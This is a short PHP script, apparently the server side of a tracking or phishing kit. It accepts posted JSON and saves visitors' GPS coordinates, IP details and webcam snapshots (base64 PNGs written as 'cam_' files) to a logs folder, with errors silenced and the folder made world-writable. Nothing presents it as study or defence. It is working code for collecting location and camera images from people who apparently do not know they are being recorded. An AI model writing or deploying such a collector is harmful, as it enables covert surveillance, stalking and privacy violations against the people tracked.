<?php
    header('Content-Type: application/json');
    error_reporting(0);
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);

    if ($data) {
        $logDir = '../../logs/';
        if (!is_dir($logDir)) { mkdir($logDir, 0777, true); }
        
        if (isset($data['lat'])) {
            file_put_contents($logDir . 'result.txt', json_encode(['status' => 'success', 'lat' => $data['lat'], 'lon' => $data['lon'], 'acc' => $data['acc']]));
        } 
        elseif (isset($data['ip'])) {
            file_put_contents($logDir . 'info.txt', json_encode($data));
        } 
        elseif (isset($data['img'])) {
            $img = str_replace(['data:image/png;base64,', ' '], ['', '+'], $data['img']);
            file_put_contents($logDir . 'cam_' . date('Ymd_His') . '.png', base64_decode($img));
        }
    }
    ?>